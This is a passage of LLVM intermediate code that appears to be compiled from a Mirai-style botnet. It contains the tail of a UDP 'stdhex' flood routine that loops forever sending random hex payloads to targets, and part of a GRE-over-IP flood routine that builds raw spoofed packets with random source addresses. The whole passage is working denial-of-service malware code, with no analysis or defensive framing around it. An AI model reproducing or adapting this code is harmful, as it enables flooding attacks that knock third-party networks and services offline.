  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 0, i32 1458)
  %43 = trunc i32 %42 to i16
  store i16 %43, i16* %14, align 2
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 1, i32 1)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 16, i32 4, i1 false)
  %49 = load i16, i16* %13, align 2
  %50 = zext i16 %49 to i32
  %51 = icmp eq i32 %50, 65535
  br i1 %51, label %52, label %55

; <label>:52:                                     ; preds = %4
  %53 = call i32 @rand_next()
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %13, align 2
  br label %58

; <label>:55:                                     ; preds = %4
  %56 = load i16, i16* %13, align 2
  %57 = call zeroext i16 @htons(i16 zeroext %56) #7
  store i16 %57, i16* %13, align 2
  br label %58

; <label>:58:                                     ; preds = %55, %52
  store i32 0, i32* %9, align 4
  br label %59

; <label>:59:                                     ; preds = %177, %58
  %60 = load i32, i32* %9, align 4
  %61 = load i8, i8* %5, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp slt i32 %60, %62
  br i1 %63, label %64, label %180

; <label>:64:                                     ; preds = %59
  %65 = bitcast [256 x i8*]* %19 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %65, i8* bitcast ([256 x i8*]* @attack_method_stdhex.satuur_thicc to i8*), i64 2048, i32 16, i1 false)
  %66 = call i32 @rand() #6
  %67 = srem i32 %66, 256
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [256 x i8*], [256 x i8*]* %19, i64 0, i64 %68
  %70 = load i8*, i8** %69, align 8
  store i8* %70, i8** %20, align 8
  %71 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %72 = load i8**, i8*** %10, align 8
  %73 = load i32, i32* %9, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i8*, i8** %72, i64 %74
  store i8* %71, i8** %75, align 8
  %76 = load i16, i16* %12, align 2
  %77 = zext i16 %76 to i32
  %78 = icmp eq i32 %77, 65535
  br i1 %78, label %79, label %88

; <label>:79:                                     ; preds = %64
  %80 = call i32 @rand_next()
  %81 = trunc i32 %80 to i16
  %82 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %83 = load i32, i32* %9, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %82, i64 %84
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i32 0, i32 0
  %87 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %86, i32 0, i32 1
  store i16 %81, i16* %87, align 2
  br label %97

; <label>:88:                                     ; preds = %64
  %89 = load i16, i16* %12, align 2
  %90 = call zeroext i16 @htons(i16 zeroext %89) #7
  %91 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %92 = load i32, i32* %9, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %91, i64 %93
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %94, i32 0, i32 0
  %96 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %95, i32 0, i32 1
  store i16 %90, i16* %96, align 2
  br label %97

; <label>:97:                                     ; preds = %88, %79
  %98 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %99 = load i32*, i32** %11, align 8
  %100 = load i32, i32* %9, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i32, i32* %99, i64 %101
  store i32 %98, i32* %102, align 4
  %103 = icmp eq i32 %98, -1
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %97
  ret void

; <label>:105:                                    ; preds = %97
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %106, align 4
  %107 = load i16, i16* %13, align 2
  %108 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %107, i16* %108, align 2
  %109 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %110 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %109, i32 0, i32 0
  store i32 0, i32* %110, align 4
  %111 = load i32*, i32** %11, align 8
  %112 = load i32, i32* %9, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i32, i32* %111, i64 %113
  %115 = load i32, i32* %114, align 4
  %116 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %117 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %117, %struct.sockaddr** %116, align 8
  %118 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %119 = load %struct.sockaddr*, %struct.sockaddr** %118, align 8
  %120 = call i32 @bind(i32 %115, %struct.sockaddr* %119, i32 16) #6
  %121 = icmp eq i32 %120, -1
  br i1 %121, label %122, label %123

; <label>:122:                                    ; preds = %105
  br label %123

; <label>:123:                                    ; preds = %122, %105
  %124 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %125 = load i32, i32* %9, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %124, i64 %126
  %128 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %127, i32 0, i32 2
  %129 = load i8, i8* %128, align 4
  %130 = zext i8 %129 to i32
  %131 = icmp slt i32 %130, 32
  br i1 %131, label %132, label %158

; <label>:132:                                    ; preds = %123
  %133 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %134 = load i32, i32* %9, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %133, i64 %135
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %136, i32 0, i32 1
  %138 = load i32, i32* %137, align 4
  %139 = call i32 @ntohl(i32 %138) #7
  %140 = call i32 @rand_next()
  %141 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %142 = load i32, i32* %9, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %141, i64 %143
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i32 0, i32 2
  %146 = load i8, i8* %145, align 4
  %147 = zext i8 %146 to i32
  %148 = lshr i32 %140, %147
  %149 = add i32 %139, %148
  %150 = call i32 @htonl(i32 %149) #7
  %151 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %152 = load i32, i32* %9, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %151, i64 %153
  %155 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %154, i32 0, i32 0
  %156 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %155, i32 0, i32 2
  %157 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %156, i32 0, i32 0
  store i32 %150, i32* %157, align 4
  br label %158

; <label>:158:                                    ; preds = %132, %123
  %159 = load i32*, i32** %11, align 8
  %160 = load i32, i32* %9, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds i32, i32* %159, i64 %161
  %163 = load i32, i32* %162, align 4
  %164 = bitcast %union.__CONST_SOCKADDR_ARG* %22 to %struct.sockaddr**
  %165 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %166 = load i32, i32* %9, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i64 %167
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %168, i32 0, i32 0
  %170 = bitcast %struct.sockaddr_in* %169 to %struct.sockaddr*
  store %struct.sockaddr* %170, %struct.sockaddr** %164, align 8
  %171 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %22, i32 0, i32 0
  %172 = load %struct.sockaddr*, %struct.sockaddr** %171, align 8
  %173 = call i32 @connect(i32 %163, %struct.sockaddr* %172, i32 16)
  %174 = icmp eq i32 %173, -1
  br i1 %174, label %175, label %176

; <label>:175:                                    ; preds = %158
  br label %176

; <label>:176:                                    ; preds = %175, %158
  br label %177

; <label>:177:                                    ; preds = %176
  %178 = load i32, i32* %9, align 4
  %179 = add nsw i32 %178, 1
  store i32 %179, i32* %9, align 4
  br label %59

; <label>:180:                                    ; preds = %59
  br label %181

; <label>:181:                                    ; preds = %212, %180
  store i32 0, i32* %9, align 4
  br label %182

; <label>:182:                                    ; preds = %209, %181
  %183 = load i32, i32* %9, align 4
  %184 = load i8, i8* %5, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp slt i32 %183, %185
  br i1 %186, label %187, label %212

; <label>:187:                                    ; preds = %182
  %188 = load i8**, i8*** %10, align 8
  %189 = load i32, i32* %9, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds i8*, i8** %188, i64 %190
  %192 = load i8*, i8** %191, align 8
  store i8* %192, i8** %23, align 8
  %193 = load i8, i8* %15, align 1
  %194 = icmp ne i8 %193, 0
  br i1 %194, label %195, label %199

; <label>:195:                                    ; preds = %187
  %196 = load i8*, i8** %23, align 8
  %197 = load i16, i16* %14, align 2
  %198 = zext i16 %197 to i32
  call void @rand_str(i8* %196, i32 %198)
  br label %199

; <label>:199:                                    ; preds = %195, %187
  %200 = load i32*, i32** %11, align 8
  %201 = load i32, i32* %9, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds i32, i32* %200, i64 %202
  %204 = load i32, i32* %203, align 4
  %205 = load i8*, i8** %23, align 8
  %206 = load i16, i16* %14, align 2
  %207 = zext i16 %206 to i64
  %208 = call i64 @send(i32 %204, i8* %205, i64 %207, i32 16384)
  br label %209

; <label>:209:                                    ; preds = %199
  %210 = load i32, i32* %9, align 4
  %211 = add nsw i32 %210, 1
  store i32 %211, i32* %9, align 4
  br label %182

; <label>:212:                                    ; preds = %182
  br label %181
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 %34, i64 8) #6
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 zeroext %37, %struct.attack_option* %38, i8 zeroext 2, i32 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 3, i32 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 4, i32 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 5, i32 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 6, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 7, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 0, i32 1458)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 1, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 19, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %76, i32* %10, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %4
  br label %433

; <label>:79:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %80 = load i32, i32* %10, align 4
  %81 = bitcast i32* %9 to i8*
  %82 = call i32 @setsockopt(i32 %80, i32 0, i32 3, i8* %81, i32 4) #6
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %84, label %87

; <label>:84:                                     ; preds = %79
  %85 = load i32, i32* %10, align 4
  %86 = call i32 @close(i32 %85)
  br label %433

; <label>:87:                                     ; preds = %79
  store i32 0, i32* %9, align 4
  br label %88

; <label>:88:                                     ; preds = %238, %87
  %89 = load i32, i32* %9, align 4
  %90 = load i8, i8* %5, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp slt i32 %89, %91
  br i1 %92, label %93, label %241

; <label>:93:                                     ; preds = %88
  %94 = call noalias i8* @calloc(i64 1458, i64 8) #6
  %95 = load i8**, i8*** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8*, i8** %95, i64 %97
  store i8* %94, i8** %98, align 8
  %99 = load i8**, i8*** %11, align 8
  %100 = load i32, i32* %9, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8*, i8** %99, i64 %101
  %103 = load i8*, i8** %102, align 8
  %104 = bitcast i8* %103 to %struct.iphdr*
  store %struct.iphdr* %104, %struct.iphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i64 1
  %107 = bitcast %struct.iphdr* %106 to %struct.grehdr*
  store %struct.grehdr* %107, %struct.grehdr** %23, align 8
  %108 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %109 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %108, i64 1
  %110 = bitcast %struct.grehdr* %109 to %struct.iphdr*
  store %struct.iphdr* %110, %struct.iphdr** %24, align 8
  %111 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %112 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %111, i64 1
  %113 = bitcast %struct.iphdr* %112 to %struct.udphdr*
  store %struct.udphdr* %113, %struct.udphdr** %25, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %115 = bitcast %struct.iphdr* %114 to i8*
  %116 = load i8, i8* %115, align 4
  %117 = and i8 %116, 15
  %118 = or i8 %117, 64
  store i8 %118, i8* %115, align 4
  %119 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %120 = bitcast %struct.iphdr* %119 to i8*
  %121 = load i8, i8* %120, align 4
  %122 = and i8 %121, -16
  %123 = or i8 %122, 5
  store i8 %123, i8* %120, align 4
  %124 = load i8, i8* %12, align 1
  %125 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i32 0, i32 1
  store i8 %124, i8* %126, align 1
  %127 = load i32, i32* %18, align 4
  %128 = sext i32 %127 to i64
  %129 = add i64 52, %128
  %130 = trunc i64 %129 to i16
  %131 = call zeroext i16 @htons(i16 zeroext %130) #7
  %132 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %133 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %132, i32 0, i32 2
  store i16 %131, i16* %133, align 2
  %134 = load i16, i16* %13, align 2
  %135 = call zeroext i16 @htons(i16 zeroext %134) #7
  %136 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 3
  store i16 %135, i16* %137, align 4
  %138 = load i8, i8* %14, align 1
  %139 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 5
  store i8 %138, i8* %140, align 4
  %141 = load i8, i8* %15, align 1
  %142 = icmp ne i8 %141, 0
  br i1 %142, label %143, label %147

; <label>:143:                                    ; preds = %93
  %144 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %145 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 4
  store i16 %144, i16* %146, align 2
  br label %147

; <label>:147:                                    ; preds = %143, %93
  %148 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 6
  store i8 47, i8* %149, align 1
  %150 = load i32, i32* %21, align 4
  %151 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 8
  store i32 %150, i32* %152, align 4
  %153 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %154 = load i32, i32* %9, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %153, i64 %155
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %156, i32 0, i32 1
  %158 = load i32, i32* %157, align 4
  %159 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 9
  store i32 %158, i32* %160, align 4
  %161 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %162 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %163 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %162, i32 0, i32 1
  store i16 %161, i16* %163, align 2
  %164 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %165 = bitcast %struct.iphdr* %164 to i8*
  %166 = load i8, i8* %165, align 4
  %167 = and i8 %166, 15
  %168 = or i8 %167, 64
  store i8 %168, i8* %165, align 4
  %169 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %170 = bitcast %struct.iphdr* %169 to i8*
  %171 = load i8, i8* %170, align 4
  %172 = and i8 %171, -16
  %173 = or i8 %172, 5
  store i8 %173, i8* %170, align 4
  %174 = load i8, i8* %12, align 1
  %175 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 1
  store i8 %174, i8* %176, align 1
  %177 = load i32, i32* %18, align 4
  %178 = sext i32 %177 to i64
  %179 = add i64 28, %178
  %180 = trunc i64 %179 to i16
  %181 = call zeroext i16 @htons(i16 zeroext %180) #7
  %182 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 2
  store i16 %181, i16* %183, align 2
  %184 = load i16, i16* %13, align 2
  %185 = zext i16 %184 to i32
  %186 = xor i32 %185, -1
  %187 = trunc i32 %186 to i16
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 3
  store i16 %188, i16* %190, align 4
  %191 = load i8, i8* %14, align 1
  %192 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 5
  store i8 %191, i8* %193, align 4
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  br i1 %195, label %196, label %200

; <label>:196:                                    ; preds = %147
  %197 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %198 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 4
  store i16 %197, i16* %199, align 2
  br label %200

; <label>:200:                                    ; preds = %196, %147
  %201 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 6
  store i8 17, i8* %202, align 1
  %203 = call i32 @rand_next()
  %204 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 8
  store i32 %203, i32* %205, align 4
  %206 = load i8, i8* %20, align 1
  %207 = icmp ne i8 %206, 0
  br i1 %207, label %208, label %214

; <label>:208:                                    ; preds = %200
  %209 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 9
  %211 = load i32, i32* %210, align 4
  %212 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 9
  store i32 %211, i32* %213, align 4
  br label %222

; <label>:214:                                    ; preds = %200
  %215 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 8
  %217 = load i32, i32* %216, align 4
  %218 = sub i32 %217, 1024
  %219 = xor i32 %218, -1
  %220 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 9
  store i32 %219, i32* %221, align 4
  br label %222

; <label>:222:                                    ; preds = %214, %208
  %223 = load i16, i16* %16, align 2
  %224 = call zeroext i16 @htons(i16 zeroext %223) #7
  %225 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %226 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %225, i32 0, i32 0
  store i16 %224, i16* %226, align 2
  %227 = load i16, i16* %17, align 2
  %228 = call zeroext i16 @htons(i16 zeroext %227) #7
  %229 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %230 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %229, i32 0, i32 1
  store i16 %228, i16* %230, align 2
  %231 = load i32, i32* %18, align 4
  %232 = sext i32 %231 to i64
  %233 = add i64 8, %232
  %234 = trunc i64 %233 to i16
  %235 = call zeroext i16 @htons(i16 zeroext %234) #7
  %236 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %237 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %236, i32 0, i32 2
  store i16 %235, i16* %237, align 2
  br label %238

; <label>:238:                                    ; preds = %222
  %239 = load i32, i32* %9, align 4
  %240 = add nsw i32 %239, 1
  store i32 %240, i32* %9, align 4
  br label %88

; <label>:241:                                    ; preds = %88
  br label %242

; <label>:242:                                    ; preds = %432, %241
  store i32 0, i32* %9, align 4
  br label %243

; <label>:243:                                    ; preds = %429, %242
  %244 = load i32, i32* %9, align 4
  %245 = load i8, i8* %5, align 1
  %246 = zext i8 %245 to i32
  %247 = icmp slt i32 %244, %246
  br i1 %247, label %248, label %432

; <label>:248:                                    ; preds = %243
  %249 = load i8**, i8*** %11, align 8
  %250 = load i32, i32* %9, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds i8*, i8** %249, i64 %251
  %253 = load i8*, i8** %252, align 8
  store i8* %253, i8** %26, align 8
  %254 = load i8*, i8** %26, align 8
  %255 = bitcast i8* %254 to %struct.iphdr*
  store %struct.iphdr* %255, %struct.iphdr** %27, align 8
  %256 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %257 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %256, i64 1
  %258 = bitcast %struct.iphdr* %257 to %struct.grehdr*
  store %struct.grehdr* %258, %struct.grehdr** %28, align 8
  %259 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %260 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %259, i64 1
  %261 = bitcast %struct.grehdr* %260 to %struct.iphdr*
  store %struct.iphdr* %261, %struct.iphdr** %29, align 8
  %262 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i64 1
  %264 = bitcast %struct.iphdr* %263 to %struct.udphdr*
  store %struct.udphdr* %264, %struct.udphdr** %30, align 8
  %265 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %266 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %265, i64 1
  %267 = bitcast %struct.udphdr* %266 to i8*
  store i8* %267, i8** %31, align 8
  %268 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %269 = load i32, i32* %9, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %268, i64 %270
  %272 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %271, i32 0, i32 2
  %273 = load i8, i8* %272, align 4
  %274 = zext i8 %273 to i32
  %275 = icmp slt i32 %274, 32
  br i1 %275, label %276, label %297

; <label>:276:                                    ; preds = %248
  %277 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %278 = load i32, i32* %9, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %277, i64 %279
  %281 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %280, i32 0, i32 1
  %282 = load i32, i32* %281, align 4
  %283 = call i32 @ntohl(i32 %282) #7
  %284 = call i32 @rand_next()
  %285 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i32 0, i32 2
  %290 = load i8, i8* %289, align 4
  %291 = zext i8 %290 to i32
  %292 = lshr i32 %284, %291
  %293 = add i32 %283, %292
  %294 = call i32 @htonl(i32 %293) #7
  %295 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i32 0, i32 9
  store i32 %294, i32* %296, align 4
  br label %297

; <label>:297:                                    ; preds = %276, %248
  %298 = load i32, i32* %21, align 4
  %299 = icmp eq i32 %298, -1
  br i1 %299, label %300, label %304

; <label>:300:                                    ; preds = %297
  %301 = call i32 @rand_next()
  %302 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %303 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %302, i32 0, i32 8
  store i32 %301, i32* %303, align 4
  br label %304

; <label>:304:                                    ; preds = %300, %297
  %305 = load i16, i16* %13, align 2
  %306 = zext i16 %305 to i32
  %307 = icmp eq i32 %306, 65535
  br i1 %307, label %308, label %323

; <label>:308:                                    ; preds = %304
  %309 = call i32 @rand_next()
  %310 = and i32 %309, 65535
  %311 = trunc i32 %310 to i16
  %312 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %313 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %312, i32 0, i32 3
  store i16 %311, i16* %313, align 4
  %314 = load %struct.iphdr*, %struct.iphdr** %27, align 8
